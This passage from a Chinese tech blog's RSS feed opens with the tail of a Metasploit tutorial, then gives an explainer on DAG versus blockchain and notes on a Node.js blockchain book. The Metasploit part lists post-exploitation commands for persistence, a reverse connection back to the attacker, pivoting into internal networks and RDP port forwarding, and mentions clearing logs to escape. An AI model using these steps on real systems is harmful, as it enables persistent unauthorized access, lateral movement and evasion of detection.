清除环境,和日志,以便逃跑</li></ol><h2 id="进阶功能使用"><a href="#进阶功能使用" class="headerlink" title="进阶功能使用"></a>进阶功能使用</h2><hr><ul><li><p>持久化控制</p><ul><li><p>使用 metsvc 服务启动建立正向连接服务</p><ul><li><p>使用其建立,一个正向链接,开放目标主机的端口,以便我们的控制链接,使用 metsvc_bind_tvp</p><pre><code>&gt; run metvc -A&gt; set payload windows/metsvc_bind_tcp</code></pre></li></ul></li></ul></li></ul><pre><code>-  persistence 启动项启动建立反向连接    -  运行 persistence 脚本让系统开机自启动 Meterpreter (-X)，10秒 (-i 10) 重连一次，使用端口为 6666(-p 6666)，连接的目的IP为 192.168.71.105             run persistence -X -i 10 -p 6666 \             -r 192.168.71.105  </code></pre><hr><ul><li><p>内网渗透</p><p>  在拿下目标主机之后, 把其作为跳板,进行更加深入的内网渗透.<br>  外网的我们,我们无法直接向其内网中其他主机发起攻击，则可以借助已产生的meterpreter会话作为路由跳板，攻击内网其它主机。</p><ul><li><p>得到目标路由表</p><pre><code>&gt; run get_local_subnets</code></pre><p>  得到目标主机的路由表, 网段,和掩码</p><pre><code>&gt; route print</code></pre></li><li><p>添加路由</p><ul><li><p>把目标主机作为一级路由, 使得我们可以进行目标主机子网域的渗透</p><pre><code>route add  192.168.249.0 255.255.255.0 5</code></pre><p>上面的是目标主机的 网段和掩码</p></li></ul></li><li><p>后渗透</p><ul><li>之后就可以对目标主机的子网进行渗透.</li></ul></li></ul></li></ul><hr><ul><li><p>Payload 类型</p><p>  对于Payload 的链接类型有 正向连接和反向连接。</p><ul><li><p>reverse_tcp</p><p>  Payload  </p><pre><code>payload/windows/meterpreter/reverse_tcp</code></pre><p>  反向连接，目标主机，对攻击机进行主动的连接</p></li><li><p>bind_tcp</p><p>  Payload</p><pre><code>payload/windows/meterpreter/bind_tcp</code></pre><p>  正向连接，因为在内网跨网段时无法连接到攻击主机，所以在内网中经常会使用。开放端口，等待攻击机连接。</p></li><li><p>reverse_http/https</p><p>  Http 请求，实现异步，不需要进行TCP的长连接， 对于经常断线，网络不好情况。</p></li></ul></li></ul><hr><ul><li><p>端口转发</p><p>  对于一些 目标端口，不对公网开开放， 我们进行端口转发，进行绕过。</p><p>  portfrd</p><pre><code>portfwd add -l 4444 -p 3389 -r 127.0.0.1</code></pre></li></ul><h2 id="后"><a href="#后" class="headerlink" title="后"></a>后</h2><p>总之，msf 实在是神器，还有许许多多的功能，需要探索。提交进核心代码库也是理想吧。</p>]]></content:encoded>
      
      <comments>https://www.diglp.xyz/2018/06/16/HackTool_MSF/#disqus_thread</comments>
    </item>
    
    <item>
      <title>What is DAG?</title>
      <link>https://www.diglp.xyz/2018/06/03/What_is_DAG/</link>
      <guid>https://www.diglp.xyz/2018/06/03/What_is_DAG/</guid>
      <pubDate>Sat, 02 Jun 2018 16:00:00 GMT</pubDate>
      <description>
      
        
        
          
          
            &lt;h2 id=&quot;What-is-DAG&quot;&gt;&lt;a href=&quot;#What-is-DAG&quot; class=&quot;headerlink&quot; title=&quot;What is DAG&quot;&gt;&lt;/a&gt;What is
          
        
      
      </description>
      
      <content:encoded><![CDATA[<h2 id="What-is-DAG"><a href="#What-is-DAG" class="headerlink" title="What is DAG"></a>What is DAG</h2><blockquote><p>DAG意思是有向无环图，所谓有向无环图是指任意一条边有方向，且不存在环路的图。[百科]</p></blockquote><p>DAG 是一种在图论中定义的结构，DAG 是<strong>（Directed acyclic graph）</strong>的缩写，翻译过来的意思是有向无环图。如下图所表示的。</p><p><img src="https://upload-images.jianshu.io/upload_images/796321-6bd22461289a94bf.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/680" alt=""></p><p>这样有向无环是指它是由集合的顶点和有向边构成，每条边连接一个顶点到另一个，这样，假如顶点A开始，沿着有序的边，是无法回到最初的起点的。</p><h2 id="DAG-与-区块链"><a href="#DAG-与-区块链" class="headerlink" title="DAG 与 区块链"></a>DAG 与 区块链</h2><p>实际上，在严格意义上讲，DAG已经是不能算作区块链了。因为这玩意，<strong>没有区块，也没有链的</strong></p><p>在我们的传统BTC的体系下，衍生出了区块链这个词。正如其名，<strong>区块构成的链</strong>，如下图。</p><p><img src="https://upload-images.jianshu.io/upload_images/796321-fa58f376b01c7061.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/700" alt=""></p><p>在图中，把DAG也作为了对比，相比较而言，DAG显得是没有那么的工整了，有点乱糟糟的感觉，不过，我们都能观察到一个特点，上图的两个结构，所表现的都是一个有向的结构，左边的区块链的从起点，到最长的端点。在DAG里，一样的是从起点，指向最远的端点。</p><p>在经典链式结构里，每个区块的产生，需要进行PoW的过程，符合要求的块，将会被加入链中，当发生分叉的时候，最长链是付出最多工作量的链，所以是以最长链为准。</p><p>然而在DAG的体系里，区块是不存在的了，每个新加入的单元，我们是称之为<strong>交易(TX)</strong>，当一个新的交易产生的时候，不单单是作为一个单位，接在另一个单位的后面，<strong>而是加入到之前的所有(N个)单位的后面</strong>。所以当你发布新交易时，前面有两个有效交易，那么你的区块会主动同时链接到前面两个之中，</p><p>DAG 中的每个新单元，验证并确认其父辈单元，父辈单元的父辈单元，慢慢可达创世单元，并将其父辈单元的哈希包含到自己的单元里面。随着时间递增，所有交易的区块链相互连接，形成图状结构，如若要更改数据，那就不仅仅是几个区块的问题了，而是整个区块图的数据更改。</p><hr><p>那么相比之下呢？</p><ul><li>单元：在区块链体系下基础单元是Block（区块），而在DAG组成单元是TX(Transaction)（交易）；</li><li>拓扑结构：区块链是由Block区块组成的<strong>单链</strong>，只能按出块时间同步依次入链，单线程的处理网络的广播消息；DAG是由交易单元组成的网络，交易和交易可以异步并发，同时的写入交易，多线程的进行网络的处理；</li><li>粒度：区块链每个区块单元记录多个用户(10Min)的多笔交易，DAG每个单元记录单个用户交易。</li></ul><p>相比之下，DAG这种结构的应用，比传统区块链，是比较复杂的。不过以交易作为最小的粒度的模式，使得区块的效率得到了很大的提高。</p><hr><p>传统区块链技术的几个问题</p><ol><li><p>TPS：指的是每秒处理的交易数，在区链的体系里，每个区块是单位，包含着很多的交易，这样经过一个长达十分钟的区块周期，比特币的效率一直比较低，由于BlockChain链式的存储结构，整个网络同时只能有一条单链，基于POW共识机制出块无法并发执行；十分钟出一个块，6个出块才能确认(pow(1/2,6)即0.015625)，大约需要一个小时；以太坊大幅改善，出块速度也要十几秒。</p></li><li><p><strong>确定性问题</strong>：这个是当前的区链系统最大的问题，就是确定性问题。    在一条链上，通过PoW形成的链是没有一个最终的确定状态，比特币和以太坊存在51%算力攻击问题，基于POW共识的最大问题隐患；只要有隐藏着的极为强大的算力，和一个隐藏的足够长的链，这样的孤岛连接主网，瞬间可能巅峰目前的一切；考虑到现实中的ASIC，以及量子计算机，这种危险现实存在。</p></li><li><p>中心化问题：基于区块的POW共识中， 矿工一方面可以形成集中化的矿场集团，另一方面，获得打包交易权的矿工拥有巨大权力，可以选择哪些交易进入区块，哪些交易不被处理，甚至可以只打包符合自己利益的交易，这样的风险目前已经是事实存在。</p></li></ol><hr><p>DAG 的特性</p><p>在DAG结构中，为了避免双花问题，当然还是有所谓的”主链“概念，不过实际上是经过验证认定的一条最短的交易路径。</p><p>不想单单的一个是节点产生的区块，在DAG的条件下，每个产生的交易，都会引用过去的 N 个交易，这样，就会证明前一个交易的合法性，从而间接证明所有交易的合法性。</p><p>这样的DAG就会有了很大的并行计算的能力，每个交易之间不再是打包成一个区块而是根据高度进行引用。没有手续费，交易产生的越多，处理速度反而是更快</p><p>所以看起来DAG的确是有不少优点的存在。</p><hr><blockquote><p>分布式系统中的一大难题就是，在可分区、一致性、可及性三者间，只能满足其二。</p><p>区块链在高效率低能耗、去中心化和安全三个方面，只可选其二，存在“不可能三角”悖论。</p></blockquote><h2 id="展望未来"><a href="#展望未来" class="headerlink" title="展望未来"></a>展望未来</h2><blockquote><p>“十到二十年之后，区块链技术发展到极致，彻底解决了可扩展性，安全性，易用性的问题之后，终局会是什么样子？</p><p>世界上八十亿人，上万亿台机器，可以瞬间（迟滞低于一秒）通过区块链网络进行无需中介，无需许可，自动编程，费用极低的，可以信赖的价值交换，价值交换的单位可以低到一分，一厘，甚至更低。</p><p>这是一个可以期待的发展局面之一。</p><p>这样的价值交换网络铺开后，会催生以前不可能有的应用……</p><p>率先在扩展性和易用性上达到一小时可以支持上百万，上亿笔交易的价值区块链，将会成为各种无法想象的应用的基石，吸引更多的用户和开发者。而各种应用的丰富，又将使这个区块链更加有价值，导致良性循环，强者亦强。”</p><p>—- 引用自王川</p></blockquote>]]></content:encoded>
      
      <comments>https://www.diglp.xyz/2018/06/03/What_is_DAG/#disqus_thread</comments>
    </item>
    
    <item>
      <title>读本好书 《Node.js区块链开发》</title>
      <link>https://www.diglp.xyz/2018/06/02/BC_Book_NodeJs%E5%8C%BA%E9%93%BE%E5%BC%80%E5%8F%91/</link>
      <guid>https://www.diglp.xyz/2018/06/02/BC_Book_NodeJs%E5%8C%BA%E9%93%BE%E5%BC%80%E5%8F%91/</guid>
      <pubDate>Fri, 01 Jun 2018 16:00:00 GMT</pubDate>
      <description>
      
        
        
          
          
            &lt;h2 id=&quot;前&quot;&gt;&lt;a href=&quot;#前&quot; class=&quot;headerlink&quot; title=&quot;前&quot;&gt;&lt;/a&gt;前&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;从现在开始填涂，实现最初的构想&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;简介&quot;&gt;&lt;a href=&quot;#简介&quot;
          
        
      
      </description>
      
      <content:encoded><![CDATA[<h2 id="前"><a href="#前" class="headerlink" title="前"></a>前</h2><blockquote><p>从现在开始填涂，实现最初的构想</p></blockquote><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><ul><li>书名：Node.js 区块链开发</li><li>作者：朱志文</li><li>ISBN：9787111566953</li></ul><p>源码和本书都是开源的,再次为 Open Free Share 呐喊</p><blockquote><p><span class="exturl" data-url="aHR0cDovL2JpdGNvaW4tb24tbm9kZWpzLmVib29rY2hhaW4ub3JnLzE=" title="http://bitcoin-on-nodejs.ebookchain.org/1">本书链接 《Node.js区块链开发》<i class="fa fa-external-link"></i></span></p><p><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0Vib29rY29pbi9lYm9va2NvaW4=" title="https://github.com/Ebookcoin/ebookcoin">项目链接 ebookcoin<i class="fa fa-external-link"></i></span></p></blockquote><p>这本是实践入手，实现了自己的区块链项目，不再是单从理论出发。通过这本书，去开始实践。</p><h2 id="前-1"><a href="#前-1" class="headerlink" title="前"></a>前</h2><p>这本书是国内的 区链相关的一大经典的书籍了,不过综合讲,这本的知识是比较散的,对于其源码的分析,知识粗略的部分章节,跟随书本的源码阅读,也做了粗浅的笔记,见笑</p><blockquote><p><span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmRpZ2xwLnh5ei90YWdzL0Vib29rQ29pbi8=" title="https://blog.diglp.xyz/tags/EbookCoin/">EbookCoin 系列<i class="fa fa-external-link"></i></span></p></blockquote><hr><p>所以这篇就是对本书的一本总结了,对一些内容进行摘录.</p><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><h3 id="杂谈"><a href="#杂谈" class="headerlink" title="杂谈"></a>杂谈</h3><p><strong>这部分汇集每本书中精彩的小小的杂谈</strong></p><blockquote><p>每本书的作者都有自己的风格</p></blockquote><p>价值传递网络的出现，可以使得万物互信，万物共享成为可能。</p><p>作为未来互联网ed基础协议知已，区块链将支撑新型的新人体系的构建，由此引发的 <strong>“信誉革命”</strong> 可能远远超乎我们的想象.</p><p>实际上,在比特币社区中,中本聪先生留下的代码的总量可能只有总规模的 <strong>2%</strong> 了.</p><blockquote><p>加密货币,是一种基于点对点网络(P2P网络),没有发行机构,总量基本固定的加密电子通货.</p></blockquote><ul><li>资料参考</li></ul><blockquote><p><span class="exturl" data-url="aHR0cDovL2Vib29rY2hhaW4ub3JnL2Vib29rY2hhaW4ucGRm" title="http://ebookchain.org/ebookchain.pdf">亿书白皮书<i class="fa fa-external-link"></i></span></p></blockquote><hr><p>经典的段落,这里做大量的引用.说的实在是有深度和道理 :</p><p><strong>利益，主宰着人类行为</strong></p><p>人活着到底是为了什么？我们每个人可能都问过自己这个问题。<strong>我们有时候踌躇满志，想要拥有一切。有时候又高尚地低下头，崇尚与世无争，无忧无虑</strong>。但在纷繁复杂的真实世界里，我们总会被<strong>某个力量</strong>牵引着，挣脱不开，欲罢不能。</p><p>这个力量，就是追求利益的欲望。利益，是什么？从网上查到的解释是：</p><blockquote><p>利益是指人类用来满足自身欲望的一系列物质和精神需求，包括：<strong>金钱、权势、色欲、名声、地位等</strong>，但凡能<strong>满足人类欲望</strong>的事物， 均可称为 <strong>利益</strong>。利益依附欲望而生，而人的基因确定了欲望的存在，组成社会的基本元素是人，就不可避免地出现了：阶级、政治、 战争……利益冲突决定着一切。</p></blockquote><p><strong>人们对利益的追求来源于人的本性</strong>。人具有三种本性，即求生的第一本性，懒惰的第二本性和不满足的第三本性（这是人和动物的根本区别）。所以，人们的利益也可以分为三类，即<strong>求生的利益，懒惰的利益以及不满足的利益</strong>。总之，人类欲望无止境。</p><p>历史名人，对于利益的名言，也是值得学习和思考的。马克思说过：“人们奋斗所争取的一切，都同他们的利益有关”，列宁也说：“几何公理要是触犯了人们的利益，那也一定会被推翻的”，霍尔巴赫的话更加直白：“利益是人类行动的一切动力”。</p><p>所以，我们不仅不用避讳谈利益，而且最好把利益作为我们分析和思考产品开发设计的根本因素。如此以来，对于理解人们为何对加密货币趋之若鹜就自然轻松多了。</p><hr><blockquote><p><span class="exturl" data-url="aHR0cDovL2JpdGNvaW4tb24tbm9kZWpzLmVib29rY2hhaW4ub3JnLzEtJUU0JUJBJTg2JUU4JUE3JUEzJUU1JThBJUEwJUU1JUFGJTg2JUU4JUI0JUE3JUU1JUI4JTgxLzYtJUU1JTg4JUE5JUU3JTlCJThBJUVGJUJDJThDJUU5JUFEJTk0JUU5JUFDJUJDJUU0JUI4JThFJUU1JUE0JUE5JUU0JUJEJUJGJUU3JTlBJTg0JUU1JTg1JUIxJUU1JTkwJThDJUU3JTlCJUFFJUU2JUEwJTg3Lmh0bWw=" title="http://bitcoin-on-nodejs.ebookchain.org/1-%E4%BA%86%E8%A7%A3%E5%8A%A0%E5%AF%86%E8%B4%A7%E5%B8%81/6-%E5%88%A9%E7%9B%8A%EF%BC%8C%E9%AD%94%E9%AC%BC%E4%B8%8E%E5%A4%A9%E4%BD%BF%E7%9A%84%E5%85%B1%E5%90%8C%E7%9B%AE%E6%A0%87.html">原文链接<i class="fa fa-external-link"></i></span></p><p><span class="exturl" data-url="aHR0cDovL2JhaWtlLmJhaWR1LmNvbS9saW5rP3VybD1vcUY1ekdRbkZCWHhmN3RzLUJGOTdGUnJSbzJyaDVvZExQSURRZ1p0TWFEWW1DS2FFN2tFdzFPaFNMcVRSWGtfMlcta0dNenRLM3l6NW1sWXJhVDdUZ2VZMm41bG0wNkJkc1NRcENzUFlOXw==" title="http://baike.baidu.com/link?url=oqF5zGQnFBXxf7ts-BF97FRrRo2rh5odLPIDQgZtMaDYmCKaE7kEw1OhSLqTRXk_2W-kGMztK3yz5mlYraT7TgeY2n5lm06BdsSQpCsPYN_">利益，网络释义<i class="fa fa-external-link"></i></span></p><p><span class="exturl" data-url="aHR0cDovL3d3dy50bXRwb3N0LmNvbS8yNDMwMjY1Lmh0bWw=" title="http://www.tmtpost.com/2430265.html">区块链到底有哪些场景和市场前景<i class="fa fa-external-link"></i></span></p></blockquote><hr><h3 id="共识"><a href="#共识" class="headerlink" title="共识"></a>共识</h3><p><strong>PoS(Proof of Stake)</strong> 股权证明机制,的机制的缺点:IPO发布,其持有的人群是部分人,所以其信用基础是不够牢固的.很难保证其不会大量的抛售.引起价值崩盘和恐慌.</p><p><strong>DPoS(Delegated Proof of Stake)</strong> 授权股权证明机制,通过投票选出主节点,不过事实的问题是<strong>投票的积极性并不高.</strong></p><hr><blockquote><p><span class="exturl" data-url="aHR0cDovL3psLnlpYml0ZS5jb20vcG9pbnQvMjAxNC8wMjA2LzE0NDQwLnNodG1s" title="http://zl.yibite.com/point/2014/0206/14440.shtml">为什么PoS与PoW不具有可比性<i class="fa fa-external-link"></i></span></p><p><span class="exturl" data-url="aHR0cDovL3d3dy44YnRjLmNvbS9Qb1ctYml0Y29pbi11cGdyYWRl" title="http://www.8btc.com/PoW-bitcoin-upgrade">“去中心化的比特币：从自组织到专业化分工”读后感<i class="fa fa-external-link"></i></span></p></blockquote><h3 id="区链架构"><a href="#区链架构" class="headerlink" title="区链架构"></a>区链架构</h3><blockquote><p>区块链的概念最近很火，它来自于比特币等加密货币的实现，但是目前，这项技术已经逐步运用在各个领域。什么是区块链技术？为了感性认识这个问题，我们可以<strong>使用谷歌地球的例子做类比</strong>，ajax不是什么新技术，但组合在一起就成就了产品谷歌地球，与之类似，区块链也不是什么新技术，但与<strong>加密解密技术、P2P网络</strong>等组合在一起，就诞生了比特币。技术人员，特别是Web开发工程师，学习了解ajax技术最早是被谷歌地球酷炫的效果所吸引。而现在，历史再一次重演，很多人被比特币的疯狂发展所吸引，进而开始研究其背后的技术——区块链。</p><p>从架构设计上来说，区块链可以简单的分为三个层次，协议层、扩展层和应用层。其中，协议层又可以分为存储层和网络层，它们相互独立但又不可分割。</p></blockquote><p>个人理解上讲，区块链的构成的确如此，协议层，实现了区块链的基本运行，其中的 加解密，共识，mining。都是他的运行过程。然后在其区块链的基础上进行拓展，最出名的就是ETH的智能合约，使得区块的数据不仅仅是代币的额度，同样的可以有编译成的EVM的机器码，在各个节点运行智能合约。</p><p>所以，区块链实际上是一个普适性的东西，可以实现了数据公开，透明，可追溯的产品架构设计方案。</p><p>在另一个层次上讲，区块链，可以是具体的技术实现，比如是BTC的数据存储形式，数据库设计形式，或者文件设计形式。</p><blockquote><p>广义的区块链技术，必须包含点对点网络设计、加密技术应用、分布式算法的实现、数据存储技术的使用等4个方面，其他的可能涉及到分布式存储、机器学习、VR、物联网、大数据等。狭义的区块链仅仅涉及到数据存储技术，数据库或文件操作等。</p></blockquote><p>(这里作为科普内容讲的是很好的。)</p><hr><p>协议层，是维护着整个区块链的基本功能的层次，在其中的角色，可以分为客户端，和节点。节点节点之间，形成了去中心化的网络。客户端，拥有着最基本的功能。(建立地址，验证签名，转账支付，查看余额等)。节点拥有的功能包括(验证签名，区块记录，区块同步等)。这个层次，构成了我们的网络基础，交易通道，和节点奖励制度。实际上交易的内容是完全自选的。</p><p>区块链所涉及到的技术，协议层主要包括网络编程、分布式算法、加密签名、数据存储技术等4个方面。</p><blockquote><p>比特币选择的是谷歌的LevelDB</p></blockquote><hr><p>拓展层，更像是我们操作系统的API，这一层次，把之前的区块链的系统封装起来。向用户暴露封装好的功能。这里最重要的功能，就是我们的智能合约了，这个概念其实早有了，实际上的实现还是在 Ethereum 的项目里，得到了很好的应用和演化。这样可以通过我们自己的编码，得到我们想要的效果，自动转账，自动付款等等。</p><hr><p>应用层，相当于我们的应用程序了，现在很多Dapp的兴起，是的应用的；浪潮在汹涌，不过目前的确是没有一款杀手级的应用的出现。</p><hr><p><strong>知识图谱</strong><br><img src="http://bitcoin-on-nodejs.ebookchain.org/styles/images/third/blockchain-lib.png" alt="知识图谱"></p><h3 id="Node-js-入门"><a href="#Node-js-入门" class="headerlink" title="Node.js 入门"></a>Node.js 入门</h3><blockquote><p><span class="exturl" data-url="aHR0cHM6Ly9vY3RvdmVyc2UuZ2l0aHViLmNvbS8=" title="https://octoverse.github.com/">GitHub 官方报告<i class="fa fa-external-link"></i></span></p></blockquote><ul><li>前10个应用简介(<strong>内容整理自原书</strong>)</li></ul><p>我们使用github的搜索功能，并选择forks数量倒序排列，查询：</p><pre><code>bitcoin language:JavaScript</code></pre><p>注意：每一个fork背后可能就是一个全新的产品，forks代表了程序被二次开发的情况，个人觉得对于技术选型相对更有说服力。</p><p>前10个应用如下：</p><ol><li><p>bitpay/bitcore　1656颗星，429个分支</p><p> 源码网址: <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2JpdHBheS9iaXRjb3Jl" title="https://github.com/bitpay/bitcore">https://github.com/bitpay/bitcore<i class="fa fa-external-link"></i></span></p><p> 第一位，这是bitpay团队的产品，号称下一代PayPal。这算是一个成功案例，足见Node.js开发加密货币的可行性。巴比特有专栏介绍。</p></li><li><p>startup-class/bitstarter-leaderboard 295颗星，386个分支</p><p> 源码网址：<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3N0YXJ0dXAtY2xhc3MvYml0c3RhcnRlci1sZWFkZXJib2FyZA==" title="https://github.com/startup-class/bitstarter-leaderboard">https://github.com/startup-class/bitstarter-leaderboard<i class="fa fa-external-link"></i></span></p><p> 第二位，这是一个基于比特币开发众筹网站的模板程序。巴比特在做众筹，很多人也想进入这个领域，可以参考学习。</p></li><li><p>bitcoinjs/bitcoinjs-lib 980颗星，305个分支</p><p> 源码网址：<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2JpdGNvaW5qcy9iaXRjb2luanMtbGli" title="https://github.com/bitcoinjs/bitcoinjs-lib">https://github.com/bitcoinjs/bitcoinjs-lib<i class="fa fa-external-link"></i></span></p><p> 第三位，这是个比特币web钱包开发包，几乎当前市面上所有的基于网站的钱包都在用，牛x吧。</p></li><li><p>askmike/gekko 866颗星，300个分支</p><p> 源码网址：<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2Fza21pa2UvZ2Vra28=" title="https://github.com/askmike/gekko">https://github.com/askmike/gekko<i class="fa fa-external-link"></i></span></p><p> 第四位，你也想推出一个像时代、okcoin那样的基于网页的交易市场吗，这个代码不容错过。不过，我个人觉得交易市场不仅仅是技术问题，Gekko也提醒您要自担风险。</p></li><li><p>bitpay/insight-ui 354颗星，267个分支</p><p> 源码网址：<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2JpdHBheS9pbnNpZ2h0LXVp" title="https://github.com/bitpay/insight-ui">https://github.com/bitpay/insight-ui<i class="fa fa-external-link"></i></span></p><p> 第五位，这是bitpay放出的一个开发web钱包的UI包（要基于bitcoin-node)，看来当前开发钱包的需求还是比较大的。可以与排行第７位的bitpay/insight-api配合开发。</p></li><li><p>kyledrake/coinpunk　733颗星，249个分支</p><p> 第六位，该项目是一个本地化的钱包服务程序，已经停止维护，取而代之的就是第３位的bitcoinjs-lib。</p></li><li><p>bitpay/insight-api（略）</p></li><li><p>cjb/GitTorrent 3065颗星，133个分支</p><p> 源码网址：<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2NqYi9HaXRUb3JyZW50" title="https://github.com/cjb/GitTorrent">https://github.com/cjb/GitTorrent<i class="fa fa-external-link"></i></span></p><p> 第八位，不过它的好评3065颗星却是最高的。这是一个去中心化的Github，作者写了一篇博客详细解释了为什么Git也要去中心化。我本人觉得，这项目确实有意思，为我们开发去中心化的产品扩展了视野。基于这个项目思路，可以设想很多有价值的应用。</p></li><li><p>bitcoinjs/bitcoinjs-server</p><p> 源码网址：<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2JpdGNvaW5qcy9iaXRjb2luanMtc2VydmVy" title="https://github.com/bitcoinjs/bitcoinjs-server">https://github.com/bitcoinjs/bitcoinjs-server<i class="fa fa-external-link"></i></span></p><p> 第九位，已经放弃维护了。</p></li><li><p>untitled-dice/untitled-dice.github.io　26颗星，114个分支</p><p>源码网址：<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3VudGl0bGVkLWRpY2UvdW50aXRsZWQtZGljZS5naXRodWIuaW8=" title="https://github.com/untitled-dice/untitled-dice.github.io">https://github.com/untitled-dice/untitled-dice.github.io<i class="fa fa-external-link"></i></span> 　</p><p>第十位，一个基于比特币的赌博网站源码。有意思的是，用户评价26颗星，很低，说明人们的价值观还是不喜欢赌博的。但是拷贝的分支却很多，对于开发者来说，这也算是比特币的一个落地应用。</p></li></ol><hr><ul><li>Why Node.js ?</li></ul><p>答案很简单，它供了诸多方便实用的工具</p><ul><li>组织方便：js没有模块化组织代码的能力。一个项目，js代码通常会分割在不同的文件中，以往的方式，处理起来非常头疼，现在利用Node.js的模块管理，可以让您彻底解脱；</li><li>资源广泛：Node.js的出现，让js第三方包像雨后春笋一样遍地开花。需要什么，一条命令，Node.js就帮您办了，这会带来极大便利；</li><li>全栈处理：开发完，还有很多事情要做，比如：要对前端代码js或css文件进行合并、压缩、混淆，以及项目部署等。体验过ruby on rails一键部署功能的小伙伴，都会印象深刻。Node.js也很容易做到，而且更加自然、流畅。</li></ul><p>在官方的描述里面</p><blockquote><p>Node.js® is a JavaScript runtime built on Chrome’s V8 JavaScript engine. Node.js uses an event-driven, non-blocking I/O model that makes it lightweight and efficient.</p></blockquote><p>翻译过来就是</p><blockquote><p>Node.js® 是一个搭建在Chrome V8上的JavaScript即时运行平台，采用事件驱动、非阻塞I/O模型，既轻量又高效。</p></blockquote><hr><ul><li><p>后端代码示例</p><p>  使用了 express 的 web 服务框架</p><pre><code>var express = require(&apos;express&apos;);var app = express();app.get(&apos;/&apos;, function (req, res) {  res.send(&apos;Hello World!&apos;);});var server = app.listen(3000, function () {  var host = server.address().address;  var port = server.address().port;  console.log(&apos;Example app listening at http://%s:%s&apos;, host, port);});</code></pre></li></ul><hr><ul><li>Node.js 编码事项</li></ul><blockquote><p><a href="zl.yibite.com/point/2014/0206/14440.shtml">您必须知道的几个Node.js编码习惯</a></p></blockquote><hr><h3 id="亿书源码"><a href="#亿书源码" class="headerlink" title="亿书源码"></a>亿书源码</h3><blockquote><p><span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmRpZ2xwLnh5ei90YWdzL0Vib29rQ29pbi8=" title="https://blog.diglp.xyz/tags/EbookCoin/">EbookCoin 系列<i class="fa fa-external-link"></i></span></p></blockquote><h2 id="开发"><a href="#开发" class="headerlink" title="开发"></a>开发</h2><p>这一部分，收集了一些开发内容和技巧。由于实在缺少前端经验，所以值对自己了解的知识做总结。</p><hr><ul><li>非对称体系下的 加密和解密</li></ul><p>文中给出了一个很好的小栗子，阐明了PKI的加密，解密，签名及签名验证的细节和实现</p><blockquote><p><span class="exturl" data-url="aHR0cDovL2JpdGNvaW4tb24tbm9kZWpzLmVib29rY2hhaW4ub3JnLzQtJUU1JUJDJTgwJUU1JThGJTkxJUU1JUFFJTlFJUU4JUI3JUI1LzAtJUU1JThBJUEwJUU1JUFGJTg2JUU0JUI4JThFJUU4JUE3JUEzJUU1JUFGJTg2LzMtJUU0JUI4JTg5JUU1JUJDJUEwJUU1JTlCJUJFJUU4JUFFJUE5JUU0JUJEJUEwJUU1JTg1JUE4JUU5JTlEJUEyJUU2JThFJThDJUU2JThGJUExJUU1JThBJUEwJUU1JUFGJTg2JUU4JUE3JUEzJUU1JUFGJTg2JUU2JThBJTgwJUU2JTlDJUFGLmh0bWw=" title="http://bitcoin-on-nodejs.ebookchain.org/4-%E5%BC%80%E5%8F%91%E5%AE%9E%E8%B7%B5/0-%E5%8A%A0%E5%AF%86%E4%B8%8E%E8%A7%A3%E5%AF%86/3-%E4%B8%89%E5%BC%A0%E5%9B%BE%E8%AE%A9%E4%BD%A0%E5%85%A8%E9%9D%A2%E6%8E%8C%E6%8F%A1%E5%8A%A0%E5%AF%86%E8%A7%A3%E5%AF%86%E6%8A%80%E6%9C%AF.html">三张图让你全面掌握加密解密技术<i class="fa fa-external-link"></i></span></p></blockquote><ul><li>Commander 使用</li></ul><p>这个是一个命令行参数解析的模块，在py里面也是有类似的</p><blockquote><p><span class="exturl" data-url="aHR0cDovL2JpdGNvaW4tb24tbm9kZWpzLmVib29rY2hhaW4ub3JnLzQtJUU1JUJDJTgwJUU1JThGJTkxJUU1JUFFJTlFJUU4JUI3JUI1LzEtJUU1JTkxJUJEJUU0JUJCJUE0JUU4JUExJThDJUU4JUFFJUJFJUU4JUFFJUExLzEtY29tbWFuZGVyJUU0JUJCJThCJUU3JUJCJThELmh0bWw=" title="http://bitcoin-on-nodejs.ebookchain.org/4-%E5%BC%80%E5%8F%91%E5%AE%9E%E8%B7%B5/1-%E5%91%BD%E4%BB%A4%E8%A1%8C%E8%AE%BE%E8%AE%A1/1-commander%E4%BB%8B%E7%BB%8D.html">commander介绍<i class="fa fa-external-link"></i></span></p></blockquote><h2 id="参考链接总汇"><a href="#参考链接总汇" class="headerlink" title="参考链接总汇"></a>参考链接总汇</h2><ul><li><span class="exturl" data-url="aHR0cDovL2JpdGNvaW4tb24tbm9kZWpzLmVib29rY2hhaW4ub3JnLzE=" title="http://bitcoin-on-nodejs.ebookchain.org/1">本书链接 《Node.js区块链开发》<i class="fa fa-external-link"></i></span></li><li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0Vib29rY29pbi9lYm9va2NvaW4=" title="https://github.com/Ebookcoin/ebookcoin">项目链接 ebookcoin<i class="fa fa-external-link"></i></span></li><li><span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmRpZ2xwLnh5ei90YWdzL0Vib29rQ29pbi8=" title="https://blog.diglp.xyz/tags/EbookCoin/">EbookCoin 系列<i class="fa fa-external-link"></i></span></li><li><span class="exturl" data-url="aHR0cDovL2Vib29rY2hhaW4ub3JnL2Vib29rY2hhaW4ucGRm" title="http://ebookchain.org/ebookchain.pdf">亿书白皮书<i class="fa fa-external-link"></i></span></li><li><span class="exturl" data-url="aHR0cDovL3d3dy50bXRwb3N0LmNvbS8yNDMwMjY1Lmh0bWw=" title="http://www.tmtpost.com/2430265.html">区块链到底有哪些场景和市场前景<i class="fa fa-external-link"></i></span></li><li><span class="exturl" 